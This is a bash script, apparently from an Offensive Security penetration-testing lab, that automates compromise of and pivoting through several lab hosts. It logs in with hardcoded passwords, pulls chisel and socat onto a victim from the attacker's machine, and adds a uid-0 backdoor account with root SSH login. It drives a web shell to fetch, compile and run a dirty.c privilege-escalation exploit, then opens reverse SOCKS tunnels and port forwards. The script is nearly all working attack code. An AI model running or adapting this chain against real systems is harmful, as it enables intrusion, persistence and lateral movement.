#!/bin/bash
#set -x
shopt -s expand_aliases
myip=$(ifconfig tun0 | grep "inet " | awk '{print $2}')
forward_ports=(445 443 389 135)
admin_chisel_port=445
it_chisel_port=6969
http_server_port=443
sean_homedir='/home/sean/dont_delete'
admin_homedir='/var/opt'

echo "Enter user password"
read password



alias sproxychains="proxychains -q -f /etc/proxychains.conf"
alias seanssh="sshpass -p 'monkey' ssh -q sean@10.11.1.251"
alias hakerssh="sshpass -p 'password123' ssh -q haker@10.11.1.251"
alias firefartssh="proxychains -q -f /etc/proxychains.conf sshpass -p 'password123' ssh -q -oHostKeyAlgorithms=+ssh-rsa firefart@10.1.1.1"
alias time_hakerssh="timeout 2 sshpass -p 'password123' ssh -q haker@10.11.1.251"
alias time_firefartssh="timeout 2 proxychains -q -f /etc/proxychains.conf sshpass -p 'password123' ssh -q -oHostKeyAlgorithms=+ssh-rsa firefart@10.1.1.1"

forward_port_it_network() {
	port=$1
	if time_hakerssh "$sean_homedir/socat tcp-l:$port,fork,reuseaddr tcp:$myip:$port &"; then
		echo "Forwarded port $port from 10.1.1.251 to $myip"
		sleep 2
	else
		echo "failed to forward $port "
	fi
}

forward_port_dev_network() {
	port=$1
	if [ $port != $admin_chisel_port ] ; then
		if time_firefartssh "$admin_homedir/socat_32 tcp-l:$port,fork,reuseaddr tcp:10.1.1.246:$port &"; then
			echo "Forwarded port $port from 10.1.1.1 to 10.11.1.251"
			sleep 2
		else
			echo "failed to forward $port "
		fi
	fi
}

clean_process_it() {
	port=$1
	process=$(hakerssh "ps -ef" | grep -e "$port" -e "chisel" | grep -v grep | awk '{print $2}' | tr '\n' ' ') ## TODO ADD GREP FOR CHISEL OTHER AWYA
	sleep 0.3
	echo "port $port process to clean: $process"
	for i in $process; do
		hakerssh "kill -9 $i"
		echo "process $i cleaned"
	done
}

clean_process_admin() {
	port=$1
	process=$(firefartssh "ps -ef" | grep -e "$port" -e "chisel" | grep -v grep | awk '{print $2}' | tr '\n' ' ')
	echo "port $port process to clean: $process"
	for i in $process; do
		firefartssh "kill -9 $i"
		sleep 1.5
		echo "process $i cleaned"
	done
}

clean_local_processes(){
	process=$(ps -ef | grep -e "chisel" -e "http.server" | grep -v grep | awk '{print $2}' | tr '\n' ' ')

	for i in $process; do
		echo "killing $i"
		echo $password | sudo -S kill -9 $i
		sleep 0.5
	done
}

echo "Cleaing previous proccesses"
clean_local_processes

echo "Uploading chisel and socat"
cd /home/p4cm4n/Pentest_Learning/linux_remote_tools/
python3 -m http.server 3000 &
server3000_pid=$!
dl_pod1=''
dl_pid2=''
if [[ $(sshpass -p 'monkey' ssh sean@10.11.1.251 "[ ! -f $sean_homedir/chisel ] && echo nofile") == 'nofile' ]]; then
	sshpass -p 'monkey' ssh sean@10.11.1.251 "mkdir $sean_homedir; wget http://$myip:3000/chisel -O $sean_homedir/chisel; chmod +x $sean_homedir/chisel" 
	dl_pid1=$!
fi
if [[ $(sshpass -p 'monkey' ssh sean@10.11.1.251 "[ ! -f $sean_homedir/socat ] && echo nofile") == 'nofile' ]]; then
	sshpass -p 'monkey' ssh sean@10.11.1.251 "wget http://$myip:3000/socat -O $sean_homedir/socat; chmod +x $sean_homedir/socat"
	dl_pid2=$!
fi

kill -9 $server3000_pid

sean_passwd=$(seanssh "cat /etc/passwd")
haker_pass='$1$haker$NDsRCbgLUPKz/svhGo2X1/'
haker_permit_login='echo "PermitRootLogin yes" >> /etc/ssh/sshd_config'
if ! hakerssh 'sleep 0.1'; then
	echo "adding haker user"
	seanssh "echo monkey | sudo -S useradd haker -p '$haker_pass' -o -u 0 -s /bin/bash" &>/dev/null
	sleep 0.5
	seanssh "echo monkey | sudo -S bash -c '$haker_permit_login'" &>/dev/null
	sleep 0.5
	seanssh "echo monkey | sudo -S mkdir -p /home/haker" &>/dev/null
	sleep 0.5
	seanssh "echo monkey | sudo -S service sshd restart" &>/dev/null
	sleep 0.5
fi

echo "Cleaning previous procceses"
clean_process_it $it_chisel_port
sleep 0.5
for i in ${forward_ports[@]}; do
	clean_process_it $i
	sleep 0.5
done

echo "Starting chisel server"
/home/p4cm4n/Pentest_Learning/linux_remote_tools/chisel server --port 6969 --reverse &
sleep 5

echo "Starging chisel client on victim server"
hakerssh "chmod +x $sean_homedir/chisel"
nohup sshpass -p 'password123' ssh -q haker@10.11.1.251 "$sean_homedir/chisel client $myip:6969 R:socks" & 
sleep 2
echo "Forwarding ports 443,445,25,27 with socat"
for i in ${forward_ports[@]}; do
	forward_port_it_network $i
done
sleep 0.5
if ! firefartssh 'id'; then
	cd /home/p4cm4n/Pentest_Learning/Offensive_Security/it_network/10.1.1.1
	echo $password | sudo -S python3 -m http.server "$http_server_port" &
	sleep 1.5
	echo "uploading exploit to 10.1.1.1"
	sproxychains curl -H "X-Forwarded-For: 10.3.3.88" -X POST -d "data=wget http://10.1.1.246:443/dirty.c -O /dev/shm/dirty.c; gcc -pthread /dev/shm/dirty.c -o /dev/shm/dirty -lcrypt; chmod +x /dev/shm/dirty" http://10.1.1.1/cmd.php
	echo "executing exploit"
		sproxychains curl -H "X-Forwarded-For: 10.3.3.88" -X POST -d "data=rm /tmp/passwd.bak" http://10.1.1.1/cmd.php
	timeout 60 proxychains -q -f /etc/proxychains.conf curl -H "X-Forwarded-For: 10.3.3.88" -X POST -d "data=/dev/shm/dirty password123" http://10.1.1.1/cmd.php
	sleep 3
fi
echo "Uploading files to 10.1.1.1"
sproxychains sshpass -p 'password123' scp -oHostKeyAlgorithms=+ssh-rsa /home/p4cm4n/Pentest_Learning/linux_remote_tools/socat_32 /home/p4cm4n/Pentest_Learning/linux_remote_tools/chisel_32 firefart@10.1.1.1:$admin_homedir/

sleep 0.5
firefartssh "chmod +x $admin_homedir/chisel_32;chmod +x $admin_homedir/socat_32" &>/dev/null 
sleep 1

echo "Cleaning previous proccesses on 10.1.1.1"
for i in ${forward_ports[@]}; do
	clean_process_admin $i
done

echo "Starting chisel server at port $admin_chisel_port Socks proxy at port 2080"
echo $password | sudo -S /home/p4cm4n/Pentest_Learning/linux_remote_tools/chisel server --reverse --port 445 &
sleep 10
nohup proxychains -q -f /etc/proxychains.conf sshpass -p 'password123' ssh -q -oHostKeyAlgorithms=+ssh-rsa firefart@10.1.1.1 "$admin_homedir/chisel_32 client 10.1.1.246:$admin_chisel_port R:2080:socks" &
sleep 1

for i in ${forward_ports[@]}; do
	forward_port_dev_network $i
done

echo "create another proxychains configuration for 2080 port";
wait